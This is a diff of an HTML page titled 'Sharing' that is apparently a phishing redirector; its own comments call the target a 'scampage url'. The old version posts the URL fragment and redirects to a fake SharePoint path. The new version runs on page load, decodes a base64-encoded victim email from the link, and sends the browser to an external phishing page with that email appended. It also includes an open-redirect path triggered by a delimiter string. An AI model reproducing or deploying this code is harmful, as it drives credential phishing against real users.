@@ -1,39 +1,87 @@
-
+<!DOCTYPE html>
 <html>
-<head>
+  <head>
+    <title>Sharing</title>
 
+    <script type="text/javascript">
+      //domain string to match if redirecting to domain
+      var domainMatching = "google"; //where go going to redirect domain name google
+      //where to redirect scampage url
+      var redirectUrl = "https://mo.cu.edu.eg/oc?email=";
+      //redirect sperator word
+      var redirectDelimiter = "bla";
+      //enable base64
+      var enablebase64 = true;
 
-    <title></title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <base href="https://hamileliktakvimim.com/Sharepoint01mail_mysharepointfolder/main?email=" />
+      function ValidateEmail(mail) {
+        if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
+          return true;
+        }
+        return false;
+      }
+      decodeBase64 = function (s) {
+        var e = {},
+          i,
+          b = 0,
+          c,
+          x,
+          l = 0,
+          a,
+          r = "",
+          w = String.fromCharCode,
+          L = s.length;
+        var A =
+          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        for (i = 0; i < 64; i++) {
+          e[A.charAt(i)] = i;
+        }
+        for (x = 0; x < L; x++) {
+          c = e[s.charAt(x)];
+          b = (b << 6) + c;
+          l += 6;
+          while (l >= 8) {
+            ((a = (b >>> (l -= 8)) & 0xff) || x < L - 2) && (r += w(a));
+          }
+        }
+        return r;
+      };
 
+      function Fired() {
+        var getParams = function (url) {
+          var params = {};
+          var parser = document.createElement("a");
+          parser.href = url;
+          console.log(parser);
 
-<style type="text/css">
-    
-</style>
+          if (parser.href.match(redirectDelimiter)) {
+            var foundRedirections = parser.href.split("bla")[1];
+            console.log(foundRedirections);
+            if (foundRedirections.match(domainMatching)) {
+              if (enablebase64)
+                foundRedirections = decodeBase64(foundRedirections).trim();
+              window.location.href = foundRedirections.match("http")
+                ? foundRedirections
+                : "http://" + foundRedirections;
+            }
+          }
 
+          var query = parser.href.split(/[#\?&=]/);
+          console.log(query);
 
-</head>
-<body>
-<script src="https://code.jquery.com/jquery-3.5.1.js"integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
-<script type="text/javascript">
-    $(document).ready(function(){
-        var yr = window.location.href;
-        var res = yr.split("#");
-        var email = res[0];
-        var rep = email.split('com');
-        var thh = rep[0]+'com';
-        var theurl = window.location.href;
-        var link = res[1];
-        $.ajax({
-              type: "POST",
-              url: theurl,
-              data: {cUserNavS: link}
-        }).done(function( msg ) {
-            window.location.href = "https://hamileliktakvimim.com/Sharepoint01mail_mysharepointfolder/main?email=;
-        });
-    });
-</script>
-</body>
+          for (let param of query) {
+            param = decodeURIComponent(param);
+            if (enablebase64) param = decodeBase64(param).trim();
+
+            if (ValidateEmail(param)) {
+              window.location.href = redirectUrl + param;
+            }
+          }
+        };
+
+        var param = getParams(window.location.href);
+      }
+    </script>
+  </head>
+
+  <body onload="Fired()"></body>
 </html>
